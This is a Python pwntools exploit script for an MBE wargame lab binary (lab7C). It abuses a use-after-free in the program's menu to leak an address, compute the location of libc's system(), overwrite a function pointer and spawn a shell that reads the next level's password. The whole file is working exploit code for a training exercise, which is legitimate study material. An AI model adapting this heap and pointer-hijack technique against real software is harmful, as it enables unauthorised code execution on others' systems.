# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB6A/exploit.py
from pwn import *
import sys
import time

settings = {

    # Path to binary
    "binary"        : "/levels/lab07/lab7C",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():
    p = process(binary.path)
    print(pidof(p))
    #pause()
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (Make a number to propagate the big_num/small_num pointer to the right place on the heap).
    p.recvuntil("Enter Choice: ")
    p.sendline("2")


    p.recvuntil("Input number to store: ")		
    p.sendline("1337")


    # Delete the number to free up the space for our new string.
    p.recvuntil("Enter Choice: ")
    p.sendline("4")

    # Make a string to propagate the big_str/small_str pointer to the right place.
    p.recvuntil("Enter Choice: ")
    p.sendline("1") # this is where it hangs, I am starting to think this is some sort of a race condition
	

    # OK, it seems the program is buffering its output and thus not displaying the last line of the print_menu() call right here ('Enter Choice: '), but instead
    # sending it along with the output triggered by our next input. Hence, instead of hanging and waiting for an input that is never about to come, 
    # we simply send out our next input anyway:
	
    #p.recvuntil("Input string to store: ")
    p.sendline("sh") # an executable file with 'cat /home/lab7A/.pass', should do the trick
	
    # OK, now let's print the 'number'
    p.recvuntil("Enter Choice: ")
    p.sendline("6")
    
    p.recvuntil("Number index to print: ")
    p.sendline("1")
	#sample output: not 1337 enough: 3078216647
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    sys.exit(1)

    small_num_addr = int(str(leak[0x11:0x1b])) # bytes 17:26 contain the number
    print("small_num()'s current address: %x", hex(small_num_addr))
	
    # Calculate the base of the code segment:
    base_code = small_num_addr & 0xfffff000
    print("Leaked address base of the code segment: %x", hex(base_code))	
	
    # Calculate the base of the data segment:
    base_libc = base_code - 0x1dd000
    print("Calculated base of the libc code segment: %x", hex(base_libc))
    
    # Calculate the address of system()
    system_addr = base_libc + 0x40190
    print("Calculated address of system@libc: %x", hex(system_addr))
	
    # OK, it's time to get our shell
    print("OK, let's get our shell")

    # 1. remove the string
    # 2. create a number (system's() address)
	# 3. 'print' the string

    # remove the string
    p.sendline("3")
    p.recv()
	
	# create a number
    p.sendline("2")
    p.sendline(str(system_addr))

    # print the string
    p.recv()
    #pause()
    p.sendline("5")
    p.sendline("1")

    p.interactive()

    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    exploit()
